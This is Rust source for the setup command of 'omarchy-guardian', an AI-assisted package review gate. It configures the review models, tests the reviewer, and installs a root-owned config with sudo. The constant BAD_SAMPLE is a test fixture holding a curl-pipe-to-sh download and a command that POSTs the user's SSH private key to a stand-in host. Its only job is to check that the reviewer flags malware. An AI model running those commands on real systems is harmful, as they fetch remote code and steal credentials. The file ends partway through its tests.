//! `omarchy-guardian setup`: pick a profile, review model, official-package
//! model and thinking level, run a two-sample test review, then write the
//! user config and (after showing a diff and asking) install the root-owned
//! system config with sudo. Terminal and system access go through two
//! traits so the flow can be tested with a script.

use std::fmt::Write as _;
use std::fs::{self, OpenOptions};
use std::io::{self, BufRead, BufReader, Read as _, Write};
use std::os::unix::fs::OpenOptionsExt as _;
use std::path::{Path, PathBuf};
use std::process::{Command, Stdio};
use std::time::{Duration, Instant};

use crate::agent::{self, SourceFile, Status};
use crate::config::file::{PartialConfig, SweepSettings, is_model_name, parse};
use crate::config::load::{self, SYSTEM_PATH};
use crate::config::model::{
    AgentSettings, Named, Profile, RootConsent, SourceClass, Thinking, builtin,
};
use crate::config::write;
use crate::engine::request::Request;
use crate::files::{AtomicWrite, O_NOFOLLOW, O_NONBLOCK, write_atomic};
use crate::tools::{self, Limits, OpenCode, Reviewer};

pub(crate) trait Terminal {
    fn say(&mut self, text: &str);
    /// `None` when no answer can be read (closed terminal).
    fn ask(&mut self, question: &str) -> Option<String>;
}

pub(crate) trait Environment {
    fn user_opencode(&self) -> Option<PathBuf>;
    fn system_opencode(&self) -> bool;
    /// Whether the Claude Code CLI is on PATH.
    fn user_claude(&self) -> bool;
    /// Whether a root-owned Claude Code CLI exists for the pacman gate.
    fn system_claude(&self) -> bool;
    fn models(&self) -> Vec<String>;
    fn test_review(&self, settings: &AgentSettings) -> Result<Duration, String>;
    /// The system file as it is now: `None` when there is none, an error
    /// when one is there that cannot be read or is not valid.
    fn existing_system(&self) -> Result<Option<SystemFile>, String>;
    fn write_user(&self, text: &str) -> Result<PathBuf, String>;
    fn write_system(&self, text: &str) -> Result<(), String>;
    fn hook_enabled(&self) -> bool;
}

#[derive(Clone, Debug, PartialEq, Eq)]
struct Choice {
    profile: Profile,
    model: Option<String>,
    official_model: Option<String>,
    /// Thinking level for community sources.
    thinking: Thinking,
}

const HEADER: &str = "# Written by `omarchy-guardian setup`. See `omarchy-guardian config show`.\n";
const USER_CLASSES: [SourceClass; 5] = [
    SourceClass::Aur,
    SourceClass::Theme,
    SourceClass::Plugin,
    SourceClass::Source,
    SourceClass::System,
];
const PRIVILEGED_COMMUNITY: [SourceClass; 2] =
    [SourceClass::ThirdPartyRepo, SourceClass::LocalPackage];

/// Sets in `config` the keys setup asks about, to exactly what was chosen
/// (a choice left on its default removes the key), and nothing else:
/// `profile`, `[agent] model`, the whole `[agent.variants]` table (only the
/// level the test run proved is mapped), the thinking level of `classes`
/// and, with `official_model`, `[class.official] model`.
fn apply_choice(
    config: &mut PartialConfig,
    choice: &Choice,
    classes: &[SourceClass],
    official_model: bool,
) {
    config.profile = Some(choice.profile);
    config.agent.model.clone_from(&choice.model);
    config.agent.variants = tested_variant(choice)
        .map(|level| (level, level.name().to_string()))
        .into_iter()
        .collect();
    if official_model {
        config
            .class_mut(SourceClass::Official)
            .model
            .clone_from(&choice.official_model);
    }
    let thinking = (choice.profile != Profile::LocalOnly).then_some(choice.thinking);
    for class in classes {
        config.class_mut(*class).thinking = thinking;
    }
}

/// The level the test run sent as `--variant`. Variant names are
/// provider-specific, so only this one is mapped: any other level stays on
/// the provider default rather than risk a rejected variant.
fn tested_variant(choice: &Choice) -> Option<Thinking> {
    (choice.profile != Profile::LocalOnly && choice.thinking != Thinking::Default)
        .then_some(choice.thinking)
}

fn render_user(choice: &Choice) -> String {
    let mut config = PartialConfig::default();
    apply_choice(&mut config, choice, &USER_CLASSES, false);
    write::render(&config, HEADER)
}

/// `existing` (the system file as it is, or an empty config when there is
/// none) with the keys setup asks about set from `choice`. Everything else
/// the file sets is carried over unchanged.
fn system_config(choice: &Choice, mut existing: PartialConfig) -> PartialConfig {
    apply_choice(&mut existing, choice, &PRIVILEGED_COMMUNITY, true);
    existing
}

/// The system file setup writes where there is none yet.
fn render_system(choice: &Choice) -> String {
    write::render(&system_config(choice, PartialConfig::default()), HEADER)
}

fn pick<T: Copy>(
    terminal: &mut dyn Terminal,
    question: &str,
    options: &[(T, String)],
    default: usize,
) -> Result<T, String> {
    let mut prompt = format!("{question}\n");
    for (index, (_, label)) in options.iter().enumerate() {
        let marker = if index == default { " (default)" } else { "" };
        // Formatting into a String cannot fail.
        let _ = writeln!(prompt, "  {}) {label}{marker}", index + 1);
    }

    loop {
        let answer = terminal
            .ask(&format!("{prompt}Choose 1-{}:", options.len()))
            .ok_or("setup cancelled: no terminal input")?;
        let answer = answer.trim();

        if answer.is_empty() {
            return Ok(options[default].0);
        }
        if let Some(choice) = answer
            .parse::<usize>()
            .ok()
            .and_then(|number| number.checked_sub(1))
            .and_then(|index| options.get(index))
        {
            return Ok(choice.0);
        }
        terminal.say("Please answer with one of the numbers shown.");
    }
}

fn yes(terminal: &mut dyn Terminal, question: &str) -> bool {
    terminal
        .ask(&format!("{question} [y/N]"))
        .is_some_and(|answer| matches!(answer.trim(), "y" | "Y" | "yes"))
}

/// Picks a model; `None` means `fallback`, the model used when this choice
/// is left unset (OpenCode's default, or the review model for official
/// packages, because `[agent] model` applies to every class). `suggested`
/// is the default answer when it is listed.
fn choose_model(
    terminal: &mut dyn Terminal,
    environment: &dyn Environment,
    question: &str,
    fallback: &str,
    suggested: Option<&str>,
) -> Result<Option<String>, String> {
    let models = environment.models();
    if models.is_empty() {
        return ask_model(terminal, question, fallback);
    }

    let mut options: Vec<(Option<usize>, String)> = vec![(None, fallback.to_string())];
    options.extend(
        models
            .iter()
            .enumerate()
            .map(|(index, model)| (Some(index), model.clone())),
    );

    let default = suggested
        .and_then(|model| models.iter().position(|listed| listed == model))
        .map_or(0, |index| index + 1);
    let picked = pick(terminal, question, &options, default)?;
    Ok(picked.map(|index| models[index].clone()))
}

/// Free-text fallback when `opencode models` lists nothing; empty keeps
/// `fallback`.
fn ask_model(
    terminal: &mut dyn Terminal,
    question: &str,
    fallback: &str,
) -> Result<Option<String>, String> {
    loop {
        let answer = terminal
            .ask(&format!(
                "{question}\nEnter provider/model (empty for {fallback}):"
            ))
            .ok_or("setup cancelled: no terminal input")?;
        let answer = answer.trim();

        if answer.is_empty() {
            return Ok(None);
        }
        if is_model_name(answer) {
            return Ok(Some(answer.to_string()));
        }
        terminal.say(
            "Please enter the model as provider/model, for example anthropic/claude-sonnet-5.",
        );
    }
}

pub(crate) fn run(
    terminal: &mut dyn Terminal,
    environment: &dyn Environment,
) -> Result<(), String> {
    // Before any question: a system file that cannot be read or is not
    // valid has to be put right first, and setup would not replace it.
    environment.existing_system().map_err(wrote_neither)?;
    terminal.say("Omarchy Guardian setup\n");

    let has_opencode = environment.user_opencode().is_some();
    let has_claude = environment.user_claude();
    announce_reviewer(terminal, environment, has_opencode, has_claude);

    let profiles: Vec<(Profile, String)> = Profile::ALL
        .iter()
        .map(|profile| {
            (
                *profile,
                format!("{} — {}", profile.name(), profile.summary()),
            )
        })
        .collect();
    let default_profile = if has_opencode || has_claude { 0 } else { 2 };
    let profile = pick(terminal, "Profile:", &profiles, default_profile)?;

    let mut choice = Choice {
        profile,
        model: None,
        official_model: None,
        thinking: builtin(profile, SourceClass::Aur).thinking,
    };
    if profile != Profile::LocalOnly {
        tune_agent(terminal, environment, &mut choice)?;
    }

    write_files(terminal, environment, &choice)?;

    if !environment.hook_enabled() {
        terminal.say(
            "\nNext: sudo /usr/lib/omarchy-guardian/enable-system-hook.sh\n\
             and: yay --makepkg /usr/lib/omarchy-guardian/guardian-makepkg --save -P --stats",
        );
    }
    Ok(())
}

/// Explains which reviewers this run can use, and what a missing one means.
fn announce_reviewer(
    terminal: &mut dyn Terminal,
    environment: &dyn Environment,
    has_opencode: bool,
    has_claude: bool,
) {
    if has_claude {
        terminal.say(&format!(
            "Claude Code found: reviews can run through the claude CLI with your Claude login \
(suggested: {SUGGESTED_CLAUDE_MODEL})."
        ));
        if !environment.system_claude() {
            terminal.say(
                "Note: the pacman gate only uses a root-owned claude at /usr/bin/claude; \
install it with: sudo pacman -S claude-code",
            );
        }
    } else if has_opencode {
        if !environment.system_opencode() {
            terminal.say(
                "Note: the pacman gate only uses a root-owned OpenCode at /usr/bin/opencode or \
/usr/local/bin/opencode. Without one, official updates proceed with a warning and \
third-party packages are blocked (standard profile).",
            );
        }
    } else {
        terminal.say(
            "Neither OpenCode nor Claude Code was found. local-only keeps source on this machine \
and needs no AI.",
        );
    }
}

/// Picks the review model, official-package model and thinking level, then
/// proves the reviewer works before returning; retries on a failed test run
/// when the user asks to, otherwise fails without writing anything.
fn tune_agent(
    terminal: &mut dyn Terminal,
    environment: &dyn Environment,
    choice: &mut Choice,
) -> Result<(), String> {
    loop {
        choice.model = choose_model(
            terminal,
            environment,
            "Model for reviews:",
            "OpenCode's default model",
            environment.user_claude().then_some(SUGGESTED_CLAUDE_MODEL),
        )?;
        let official_fallback = choice.model.as_ref().map_or_else(
            || "OpenCode's default model".to_string(),
            |model| format!("Same as the review model ({model})"),
        );
        choice.official_model = choose_model(
            terminal,
            environment,
            "Model for official Arch/Omarchy packages (a fast model keeps updates quick):",
            &official_fallback,
            None,
        )?;

        let levels: Vec<(Thinking, String)> = Thinking::ALL
            .iter()
            .map(|level| (*level, level.name().to_string()))
            .collect();
        let default_level = levels
            .iter()
            .position(|(level, _)| *level == choice.thinking)
            .unwrap_or(0);
        choice.thinking = pick(
            terminal,
            "Thinking level for community sources:",
            &levels,
            default_level,
        )?;

        let settings = AgentSettings {
            model: choice.model.clone(),
            thinking: choice.thinking,
            variant: tested_variant(choice).map(|level| level.name().to_string()),
            timeout_secs: 300,
            ..AgentSettings::default()
        };

        terminal.say("Testing the reviewer with a malicious and a clean sample...");
        let mut result = environment.test_review(&settings);

        // The pacman gate reviews official packages with their own model and
        // thinking level; prove that pairing too before it goes into the
        // root-owned system file.
        let official = official_settings(choice);
        if result.is_ok()
            && (official.model != settings.model || official.variant != settings.variant)
        {
            terminal.say(&format!(
                "Testing the official-package reviewer ({})...",
                official.label()
            ));
            result = environment
                .test_review(&official)
                .map_err(|reason| format!("official-package reviewer: {reason}"));
        }

        match result {
            Ok(elapsed) => {
                terminal.say(&format!("Reviewer works ({}s).", elapsed.as_secs()));
                return Ok(());
            }
            Err(reason) => {
                terminal.say(&format!("Test failed: {reason}"));
                if !yes(terminal, "Try different settings?") {
                    return Err("setup cancelled; nothing was written".into());
                }
            }
        }
    }
}

/// What the pacman gate will run for official packages with these choices:
/// the official model or else `[agent] model`, the profile's official
/// thinking level, and a `--variant` only if that level is the mapped one.
fn official_settings(choice: &Choice) -> AgentSettings {
    let thinking = builtin(choice.profile, SourceClass::Official).thinking;
    AgentSettings {
        model: choice
            .official_model
            .clone()
            .or_else(|| choice.model.clone()),
        thinking,
        variant: (tested_variant(choice) == Some(thinking)).then(|| thinking.name().to_string()),
        timeout_secs: 300,
        ..AgentSettings::default()
    }
}

/// Renders both files (the system one as written where there is none yet),
/// parses them back and requires the parsed model and variant fields to
/// exactly match what was selected: a model name the parser would refuse or
/// read differently fails here, before anything is written.
fn validate_rendered(choice: &Choice) -> Result<(String, String), String> {
    let user_text = render_user(choice);
    let system_text = render_system(choice);
    let user_config =
        parse(Path::new("user config"), &user_text).map_err(|error| error.to_string())?;
    let system_config =
        parse(Path::new("system config"), &system_text).map_err(|error| error.to_string())?;

    let variants: Vec<(Thinking, String)> = tested_variant(choice)
        .map(|level| (level, level.name().to_string()))
        .into_iter()
        .collect();

    let matches = user_config.agent.model == choice.model
        && system_config.agent.model == choice.model
        && user_config.agent.variants == variants
        && system_config.agent.variants == variants
        && system_config.class(SourceClass::Official).model == choice.official_model;
    if matches {
        Ok((user_text, system_text))
    } else {
        Err("rendered config does not match the selection; nothing was written".into())
    }
}

/// Validates and writes the user file, then shows a diff of the system file
/// and installs it with sudo only after explicit confirmation. A system file
/// that cannot be read or is not valid stops setup before either is written.
fn write_files(
    terminal: &mut dyn Terminal,
    environment: &dyn Environment,
    choice: &Choice,
) -> Result<(), String> {
    let existing = environment.existing_system().map_err(wrote_neither)?;
    let (user_text, new_system_text) = validate_rendered(choice)?;
    // What will be installed: the file as it is with the keys setup asks
    // about changed, not a new file that drops the rest.
    let (existing_text, system_text) = match existing {
        Some(file) => {
            let text = write::render(&system_config(choice, file.config), HEADER);
            (file.text, text)
        }
        None => (String::new(), new_system_text),
    };

    let user_path = environment.write_user(&user_text)?;
    terminal.say(&format!("Wrote {}", user_path.display()));

    terminal.say(&format!(
        "\nSystem file {SYSTEM_PATH} (settings for the pacman gate):"
    ));
    terminal.say(&line_diff(&existing_text, &system_text));
    if yes(terminal, "Install it with sudo?") {
        environment.write_system(&system_text)?;
        terminal.say(&format!("Wrote {SYSTEM_PATH}"));
    } else {
        terminal.say("Skipped; the pacman gate keeps its current settings.");
    }
    Ok(())
}

/// Why setup stopped on a system file it will not change, with what that
/// means for the user's own file.
fn wrote_neither(mut reason: String) -> String {
    reason.push_str(
        "\nSetup wrote nothing, not your own settings file either: it does not save one while \
the system file is in a state it cannot change.",
    );
    reason
}

/// What changes between two config texts. A setting is told apart by the
/// table it is under as well as its line, so the same line under two tables
/// is two settings: every one the new text no longer has is a `-` line
/// naming its table, listed first. The new text follows, a setting the old
/// one did not have under that table marked `+`. Order and spacing alone
/// change nothing.
pub(crate) fn line_diff(old: &str, new: &str) -> String {
    let old = settings_lines(old);
    let new = settings_lines(new);
    let mut text = String::new();

    for (table, line) in old.iter().filter(|entry| !new.contains(entry)) {
        // A table's own line and the spacing say nothing its settings do not.
        if line.trim().is_empty() || is_table(line) {
            continue;
        }
        // Formatting into a String cannot fail.
        let _ = if table.is_empty() {
            writeln!(text, "- {line}")
        } else {
            writeln!(text, "- {table} {line}")
        };
    }
    for entry in &new {
        let same = entry.1.trim().is_empty() || old.contains(entry);
        let marker = if same { " " } else { "+" };
        let _ = writeln!(text, "{marker} {}", entry.1);
    }
    text
}

/// Each line of a config text with the table it is under: none before the
/// first table, and none for what belongs to no table (a table's own line,
/// a comment, spacing).
fn settings_lines(text: &str) -> Vec<(&str, &str)> {
    let mut table = "";
    text.lines()
        .map(|line| {
            let trimmed = line.trim();
            if is_table(line) {
                table = trimmed.find(']').map_or(trimmed, |end| &trimmed[..=end]);
                ("", line)
            } else if trimmed.is_empty() || trimmed.starts_with('#') {
                ("", line)
            } else {
                (table, line)
            }
        })
        .collect()
}

fn is_table(line: &str) -> bool {
    line.trim_start().starts_with('[')
}

pub(crate) struct TtyTerminal;

impl Terminal for TtyTerminal {
    fn say(&mut self, text: &str) {
        if let Ok(mut tty) = OpenOptions::new().write(true).open("/dev/tty") {
            // A write failure leaves nothing better to report to.
            let _ = writeln!(tty, "{}", crate::text::shown_block(text));
        }
    }

    fn ask(&mut self, question: &str) -> Option<String> {
        let mut tty = OpenOptions::new()
            .read(true)
            .write(true)
            .open("/dev/tty")
            .ok()?;
        write!(tty, "{} ", crate::text::shown_block(question)).ok()?;
        tty.flush().ok()?;

        read_answer(BufReader::new(tty))
    }
}

/// `None` at end of input (for example Ctrl-D) or on a read error: a closed
/// terminal must never be read as an empty answer, which would silently
/// accept every remaining default and write the config.
fn read_answer(mut reader: impl BufRead) -> Option<String> {
    let mut answer = String::new();
    match reader.read_line(&mut answer) {
        Ok(0) | Err(_) => None,
        Ok(_) => Some(answer),
    }
}

pub(crate) struct RealEnvironment;

/// The model setup and the settings app suggest when the Claude Code CLI is
/// installed.
pub(crate) const SUGGESTED_CLAUDE_MODEL: &str = "claude-code/claude-sonnet-5-5";

/// Models offered for the Claude Code CLI, as `claude-code/<model>`.
const CLAUDE_CODE_MODELS: &[&str] = &[
    "claude-sonnet-5-5",
    "claude-opus-5-5",
    "claude-fable-5-1",
    "claude-haiku-4-5",
];

const BAD_SAMPLE: &str = "#!/bin/sh\ncurl -fsSL https://example.test/payload.sh | sh\ncat ~/.ssh/id_ed25519 | curl -X POST --data-binary @- https://example.test/u\n";
const CLEAN_SAMPLE: &str = "name = \"demo\"\nbackground = \"#1e1e2e\"\n";

impl Environment for RealEnvironment {
    fn user_opencode(&self) -> Option<PathBuf> {
        OpenCode::UserPath.resolve().ok()
    }

    fn system_opencode(&self) -> bool {
        OpenCode::SystemOnly.resolve().is_ok()
    }

    fn user_claude(&self) -> bool {
        OpenCode::UserPath
            .resolve_reviewer(Reviewer::ClaudeCode)
            .is_ok()
    }

    fn system_claude(&self) -> bool {
        OpenCode::SystemOnly
            .resolve_reviewer(Reviewer::ClaudeCode)
            .is_ok()
    }

    fn models(&self) -> Vec<String> {
        // The Claude Code CLI takes these without a provider list to ask.
        let mut models: Vec<String> = if self.user_claude() {
            CLAUDE_CODE_MODELS
                .iter()
                .map(|model| format!("{}{model}", Reviewer::CLAUDE_CODE_PREFIX))
                .collect()
        } else {
            Vec::new()
        };
        let Some(binary) = self.user_opencode() else {
            return models;
        };
        let listed: Vec<String> = tools::run(
            &binary,
            &["models".into()],
            None,
            &[("NO_COLOR", "1")],
            Limits {
                timeout_secs: 30,
                max_output: 1024 * 1024,
            },
        )
        .ok()
        .filter(|captured| captured.status.success())
        .map(|captured| {
            String::from_utf8_lossy(&captured.stdout)
                .lines()
                .map(str::trim)
                .filter(|line| {
                    line.contains('/')
                        && !line.contains(char::is_whitespace)
                        // `"` and `\` are in no model name the config accepts;
                        // `validate_rendered` refuses them too, but such a name
                        // should never reach the picker in the first place.
                        && !line.contains('"')
                        && !line.contains('\\')
                })
                .map(str::to_string)
                .collect()
        })
        .unwrap_or_default();
        models.extend(listed);
        models
    }

    fn test_review(&self, settings: &AgentSettings) -> Result<Duration, String> {
        let binary = OpenCode::UserPath
            .resolve_reviewer(Reviewer::for_model(settings.model.as_deref()))
            .map_err(|error| error.to_string())?;
        let started = Instant::now();

        let bad_request = Request::for_files(
            SourceClass::Aur,
            &[SourceFile {
                path: "install.sh".into(),
                content: BAD_SAMPLE.into(),
            }],
        );
        let bad = agent::review(
            &binary,
            &|nonce: &str| bad_request.render(nonce),
            settings,
            false,
        )
        .map_err(|error| error.into_error().to_string())?;
        if bad.status != Status::Suspicious && bad.findings.is_empty() {
            return Err("the model did not flag the malicious sample".into());
        }

        let clean_request = Request::for_files(
            SourceClass::Theme,
            &[SourceFile {
                path: "theme.conf".into(),
                content: CLEAN_SAMPLE.into(),
            }],
        );
        let clean = agent::review(
            &binary,
            &|nonce: &str| clean_request.render(nonce),
            settings,
            false,
        )
        .map_err(|error| error.into_error().to_string())?;
        if clean.status != Status::Clear || !clean.findings.is_empty() {
            return Err("the model flagged a harmless sample".into());
        }
        Ok(started.elapsed())
    }

    fn existing_system(&self) -> Result<Option<SystemFile>, String> {
        load_system(&Place::system())
    }

    fn write_user(&self, text: &str) -> Result<PathBuf, String> {
        let path = load::user_config_path().ok_or("cannot find the user config directory")?;
        let directory = path.parent().ok_or("invalid user config path")?;
        fs::create_dir_all(directory).map_err(|error| error.to_string())?;

        // A file of its own, made new (never written through a link
        // somebody left under a fixed name), then moved into place.
        let options = AtomicWrite {
            mode: 0o644,
            sync: true,
            ..AtomicWrite::private(
                directory.join(format!(".config.toml.{}.tmp", std::process::id())),
            )
        };
        write_atomic(&path, text.as_bytes(), &options).map_err(|error| error.to_string())?;
        crate::audit::settings_changed("the user settings file was saved");
        Ok(path)
    }

    fn write_system(&self, text: &str) -> Result<(), String> {
        write_system_at(&Place::system(), &install_system_file, text)
    }

    fn hook_enabled(&self) -> bool {
        Path::new("/etc/pacman.d/hooks/omarchy-guardian.hook").exists()
    }
}

/// A system config file as it was read.
pub(crate) struct SystemFile {
    /// Its text, for the diff shown before it is replaced.
    text: String,
    config: PartialConfig,
}

/// How a new system file is put in place: with sudo, or recorded by a test.
type Install<'a> = dyn Fn(&str) -> Result<(), String> + 'a;

/// Where the system file is, and the check it has to pass before what it
/// holds is taken over into a new one: the gate's own, or a test's.
struct Place<'a> {
    path: &'a Path,
    secure: &'a dyn Fn(&Path) -> Result<(), load::Insecure>,
}

impl Place<'static> {
    /// The system file, held to what the gate requires of it.
    fn system() -> Self {
        Self {
            path: Path::new(SYSTEM_PATH),
            secure: &load::check_root_owned,
        }
    }
}

/// More than any system config holds; a larger file is not read.
const MAX_SYSTEM_FILE: u64 = 1024 * 1024;

/// How to correct the system file at `path`, for a refusal to end with.
fn how_to_correct(path: &Path) -> String {
    format!(
        "Correct it with `sudoedit {}` or \"Edit system file\" in the settings app; \
`omarchy-guardian config check` shows the problem.",
        path.display()
    )
}

/// The refusal of a system file the gate's check does not accept: the file,
/// named once, the reason, and the repair. `unverified` says the owner only
/// looks like nobody's, in a user namespace that does not map root: there
/// is then nothing for `chown` to correct, and nowhere to run it.
fn insecure_refusal(path: &Path, insecure: &load::Insecure, unverified: bool) -> String {
    let shown = path.display();
    let named = insecure.said_of(path);
    if unverified {
        return format!(
            "{named}; it was not changed. This is running in a user namespace that does not \
map root, where root's files look like nobody's: run it outside the sandbox."
        );
    }
    let directory = path.parent().unwrap_or(path).display();
    format!(
        "{named}; it was not changed. Check what it holds, then make it \
root's: `sudo chown root:root {directory} {shown} && sudo chmod 755 {directory} && sudo chmod 644 \
{shown}` (`omarchy-guardian config check` shows the problem)."
    )
}

/// Loads the system config for editing: `None` when there is no file (or
/// no directory for it), the file when it is there, safe and valid.
/// Anything else is an error naming the file, the reason and the repair,
/// for the caller to stop on. A file that cannot be read or does not parse
/// is never taken for a missing one: what would then be installed in its
/// place holds none of what it set. And one the gate refuses (not a regular
/// file, not root's, writable by others, or in such a directory) is never
/// read: installing its content again as root's would make the gate accept
/// what somebody other than root wrote. A link is not followed, whether or
/// not it leads anywhere.
fn load_system(place: &Place<'_>) -> Result<Option<SystemFile>, String> {
    let path = place.path;
    let shown = path.display();
    let unreadable = |error: &io::Error| {
        format!(
            "cannot read {shown}: {error}; it was not changed. {}",
            how_to_correct(path)
        )
    };
    let kind = match fs::symlink_metadata(path) {
        Ok(metadata) => metadata.file_type(),
        Err(error) if error.kind() == io::ErrorKind::NotFound => return Ok(None),
        Err(error) => return Err(unreadable(&error)),
    };
    if !kind.is_file() {
        let what = if kind.is_symlink() {
            "a symbolic link"
        } else if kind.is_dir() {
            "a directory"
        } else {
            "not a regular file"
        };
        return Err(format!(
            "{shown} is {what}, so it was not read or changed. Put a root-owned regular file \
there or remove it with sudo; `omarchy-guardian config check` shows the problem."
        ));
    }
    if let Err(insecure) = (place.secure)(path) {
        return Err(insecure_refusal(path, &insecure, insecure.unverified()));
    }

    // Opened without following a link or waiting on a pipe put there since.
    let mut bytes = Vec::new();
    OpenOptions::new()
        .read(true)
        .custom_flags(O_NOFOLLOW | O_NONBLOCK)
        .open(path)
        .and_then(|file| {
            if file.metadata()?.is_file() {
                file.take(MAX_SYSTEM_FILE + 1).read_to_end(&mut bytes)
            } else {
                Err(io::Error::other("not a regular file"))
            }
        })
        .map_err(|error| unreadable(&error))?;
    if bytes.len() as u64 > MAX_SYSTEM_FILE {
        return Err(format!(
            "{shown} is larger than {} KiB, so it was not read or changed. {}",
            MAX_SYSTEM_FILE / 1024,
            how_to_correct(path)
        ));
    }
    let text = String::from_utf8(bytes).map_err(|_| {
        format!(
            "{shown} is not UTF-8 text; it was not changed. {}",
            how_to_correct(path)
        )
    })?;
    match parse(path, &text) {
        Ok(config) => Ok(Some(SystemFile { text, config })),
        Err(error) => Err(format!(
            "{error}; the file is not valid and was not changed. {}",
            how_to_correct(path)
        )),
    }
}

/// The system config at `place` with `change` made to it and nothing else,
/// under the comment header it had, and the file's text as it is now (empty
/// when there is none).
fn edited_system(
    place: &Place<'_>,
    change: impl FnOnce(&mut PartialConfig),
) -> Result<(String, String), String> {
    let (existing, mut config) = load_system(place)?
        .map(|file| (file.text, file.config))
        .unwrap_or_default();
    change(&mut config);
    let header = comment_header(&existing);
    let header = if header.is_empty() {
        HEADER
    } else {
        header.as_str()
    };
    Ok((write::render(&config, header), existing))
}

/// Installs `text`, a whole system config, over the one at `place`, which
/// has to be absent or safe and valid. Four system-only settings no screen
/// edits (the trusted reviewer packages, the sweep's root consent, the
/// accepted weaker settings and whether a block can be permitted under
/// strict) are carried over from it, each only when `text` does not set it
/// at all: one `text` sets, to any value, is installed as `text` has it,
/// and every other setting is installed as `text` has it or leaves it out.
fn write_system_at(place: &Place<'_>, install: &Install<'_>, text: &str) -> Result<(), String> {
    match load_system(place)? {
        Some(existing) => install(&keep_system_only(text, &existing.config)?),
        None => install(text),
    }
}

/// `text` with the four system-only settings of [`write_system_at`] carried
/// over from `old`, each only where `text` does not set it at all.
fn keep_system_only(text: &str, old: &PartialConfig) -> Result<String, String> {
    let mut new = parse(Path::new(SYSTEM_PATH), text)
        .map_err(|error| format!("the new system settings are not valid: {error}"))?;
    let missing_trust =
        new.trusted_reviewer_packages.is_none() && old.trusted_reviewer_packages.is_some();
    let missing_sweep =
        new.sweep == SweepSettings::default() && old.sweep != SweepSettings::default();
    let missing_accepted = new.acknowledged_weaker.is_none() && old.acknowledged_weaker.is_some();
    let missing_permit = new.permit_strict.is_none() && old.permit_strict.is_some();
    if !missing_trust && !missing_sweep && !missing_accepted && !missing_permit {
        return Ok(text.to_string());
    }
    if missing_permit {
        new.permit_strict = old.permit_strict;
    }
    if missing_trust {
        new.trusted_reviewer_packages
            .clone_from(&old.trusted_reviewer_packages);
    }
    if missing_accepted {
        new.acknowledged_weaker.clone_from(&old.acknowledged_weaker);
    }
    if missing_sweep {
        new.sweep = old.sweep.clone();
    }
    let header = comment_header(text);
    Ok(write::render(&new, &header))
}

/// The comment lines a config file starts with.
fn comment_header(text: &str) -> String {
    text.lines()
        .take_while(|line| line.starts_with('#'))
        .fold(String::new(), |mut header, line| {
            header.push_str(line);
            header.push('\n');
            header
        })
}

/// Records whether the system sweep may run its root collector, and the
/// group that may read what the daily one finds, in the system config.
pub(crate) fn set_sweep_root(consent: RootConsent, group: Option<String>) -> Result<(), String> {
    set_sweep_root_at(&Place::system(), &install_system_file, consent, group)
}

fn set_sweep_root_at(
    place: &Place<'_>,
    install: &Install<'_>,
    consent: RootConsent,
    group: Option<String>,
) -> Result<(), String> {
    let (text, _) = edited_system(place, |config| {
        config.sweep = SweepSettings {
            root: Some(consent),
            group,
        };
    })?;
    install(&text)
}

/// The system config with `keys` as its accepted weaker settings (none
/// removes the list), and the file as it is now: for the diff the user
/// approves before `install_accepted` installs it.
pub(crate) fn with_accepted(keys: Vec<String>) -> Result<(String, String), String> {
    with_accepted_at(&Place::system(), keys)
}

fn with_accepted_at(place: &Place<'_>, keys: Vec<String>) -> Result<(String, String), String> {
    edited_system(place, |config| {
        config.acknowledged_weaker = (!keys.is_empty()).then_some(keys);
    })
}

/// Installs the text `with_accepted` rendered, with sudo.
pub(crate) fn install_accepted(text: &str) -> Result<(), String> {
    install_system_file(text)
}

/// Installs `text` as the system config, the pacman gate's trust root.
/// The text goes to `install` on its standard input, so no file another
/// process could rewrite during the password prompt stands between the
/// diff the user approved and `/etc`; the installed file is then read back
/// and compared. The directory is created explicitly with 0755: `install -D`
/// would create it with sudo's umask, and a 0700 directory hides the file
/// from the pacman hook, which runs as the user and would then block every
/// transaction.
fn install_system_file(text: &str) -> Result<(), String> {
    let directory = Path::new(SYSTEM_PATH)
        .parent()
        .ok_or("invalid system config path")?;

    sudo_install(
        &["-d", "-m", "0755", "-o", "root", "-g", "root"],
        &[directory],
        None,
    )?;
    sudo_install(
        &["-m", "0644", "-o", "root", "-g", "root"],
        &[Path::new("/dev/stdin"), Path::new(SYSTEM_PATH)],
        Some(text),
    )?;
    match fs::read_to_string(SYSTEM_PATH) {
        Ok(installed) if installed == text => {
            crate::audit::settings_changed("the system settings file was saved");
            Ok(())
        }
        Ok(_) => Err(format!(
            "{SYSTEM_PATH} does not hold the config you approved; check it before relying on the gates"
        )),
        Err(error) => Err(format!("cannot read back {SYSTEM_PATH}: {error}")),
    }
}

fn sudo_install(flags: &[&str], paths: &[&Path], input: Option<&str>) -> Result<(), String> {
    let mut command = Command::new("/usr/bin/sudo");
    command.arg("/usr/bin/install").args(flags).args(paths);
    if input.is_some() {
        command.stdin(Stdio::piped());
    }
    let mut child = command.spawn().map_err(|error| error.to_string())?;
    if let Some(text) = input
        && let Some(mut stdin) = child.stdin.take()
    {
        // sudo prompts on the terminal, not on this pipe, so the text is
        // written while it waits; a failed write shows in install's status.
        drop(stdin.write_all(text.as_bytes()));
    }
    let status = child.wait().map_err(|error| error.to_string())?;
    if status.success() {
        Ok(())
    } else {
        Err(format!("sudo install exited with {status}"))
    }
}

#[cfg(test)]
mod tests {
    use std::cell::RefCell;
    use std::collections::VecDeque;
    use std::path::{Path, PathBuf};
    use std::time::Duration;

    use super::{
        Choice, Environment, Terminal, read_answer, render_system, render_user, run,
        validate_rendered,
    };
    use crate::config::file::parse;
    use crate::config::model::{AgentSettings, Profile, Thinking};

    struct Script {
        answers: VecDeque<&'static str>,
        output: String,
    }

    impl Terminal for Script {
        fn say(&mut self, text: &str) {
            self.output.push_str(text);
            self.output.push('\n');
        }

        fn ask(&mut self, question: &str) -> Option<String> {
            self.output.push_str(question);
            self.output.push('\n');
            self.answers.pop_front().map(str::to_string)
        }
    }

    #[derive(Default)]
    #[expect(
        clippy::struct_excessive_bools,
        reason = "independent switches of a test double"
    )]
    struct Fake {
        opencode: bool,
        /// The Claude Code CLI is on PATH.
        claude: bool,
        test_passes: bool,
        /// `opencode models` listed nothing.
        no_models: bool,
        /// A model whose test review fails even when `test_passes` is set.
        failing_model: Option<&'static str>,
        /// Where the system file is (a file, a directory in its place, or
        /// nothing); `None` for no system file at all.
        system_path: Option<PathBuf>,
        /// Whose the gate's check finds that file to be, when it refuses it.
        system_insecure: Option<u32>,
        user_written: RefCell<Option<String>>,
        system_written: RefCell<Option<String>>,
        tested: RefCell<Vec<AgentSettings>>,
    }

    impl Fake {
        /// The check on the system file's owner and mode: a test's files
